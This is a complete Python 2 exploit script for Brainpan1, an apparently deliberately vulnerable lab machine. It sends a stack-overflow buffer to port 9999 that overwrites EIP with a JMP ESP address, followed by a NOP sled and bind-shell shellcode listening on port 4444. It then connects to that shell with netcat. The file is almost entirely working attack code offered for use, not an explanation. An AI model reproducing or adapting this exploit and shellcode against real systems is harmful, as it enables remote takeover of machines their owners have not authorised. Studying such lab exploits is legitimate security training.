# brainpan_exploit.py by 1N3 - 20131121
# 
#      `7MN.   `7MF'        
# __,    MMN.    M          
#`7MM    M YMb   M  pd""b.  
#  MM    M  `MN. M (O)  `8b 
#  MM    M   `MM.M      ,89 
#  MM    M     YMM    ""Yb. 
#.JMML..JML.    YM       88 
#                  (O)  .M' 
#                   bmmmd'  
#                           
#
#!/usr/bin/python
# Brainpan1 Exploit by 1N3 @ CrowdShield - https://crowdshield.com
#

import socket
import os
import subprocess


# vars
target = "192.168.1.132"
buffer1 = '\x41' * 520
ebp = '\x90' * 4
EIP = "\xf3\x12\x17\x31" #311712F3 JMP ESP brainpan.exe
command = "nc -vv 192.168.1.132 4444"


#shellcode bind shell port 4444 192.168.1.132
shellcode = ("\xd9\xea\xd9\x74\x24\xf4\xbb\xda\x05\x64\xb7\x5a\x29\xc9" +
"\xb1\x14\x31\x5a\x19\x03\x5a\x19\x83\xc2\x04\x38\xf0\x55" +
"\x6c\x4b\x18\xc6\xd1\xe0\xb5\xeb\x5c\xe7\xfa\x8a\x93\x67" +
"\xa1\x0c\x7e\x0f\x54\xb1\x6f\x93\x32\xa1\xde\x7b\x4a\x20" +
"\x8a\x1d\x14\x6e\xcb\x68\xe5\x74\x7f\x6e\x56\x12\xb2\xee" +
"\xd5\x6b\x2a\x23\x59\x18\xea\xd1\x65\x47\xc0\xa5\xd3\x0e" +
"\x22\xcd\xcc\xdf\xa1\x65\x7b\x0f\x24\x1c\x15\xc6\x4b\x8e" +
"\xba\x51\x6a\x9e\x36\xaf\xed")


# NOOP sled
NOOP_sled = '\x90' * 104


# construct entire buffer - 1004 bytes
buffer = buffer1 + ebp + EIP + NOOP_sled + shellcode


print "**********************************************"
print "buffer1 length: " +str(len(buffer1))
print "EIP length: " +str(len(EIP))
print "shellcode length: " +str(len(shellcode))
print "NOOP_sled length: " +str(len(NOOP_sled))
print "Total buffer length: " +str(len(buffer))
print "**********************************************"
print "Fuzzing " + target + " on port 9999 with " +str(len(buffer)) + " bytes"
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=s.connect((target,9999))
s.recv(1024)
print "Sending evil buffer..." + buffer
s.send(buffer)
print "Done..."
print "Connecting to bind shell..."
subprocess.call(command)
os.system(command)
print "Done..."
s.close()
exit
